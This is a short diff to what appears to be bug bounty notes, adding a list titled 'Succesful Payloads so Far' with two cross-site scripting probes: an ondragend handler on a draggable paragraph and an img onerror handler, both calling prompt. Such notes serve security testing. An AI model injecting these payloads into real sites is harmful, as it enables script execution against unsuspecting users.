@@ -1326,6 +1326,14 @@ There is a nice PoC on the Bug Bounty Playbook
 8) Start.
 
 
+Succesful Payloads so Far
+
+<p ondragend=[1].map(prompt) draggable="true">dragMe</p>
+
+<img/src=x onerror=prompt(1)>
+
+
+
 
 
 ```
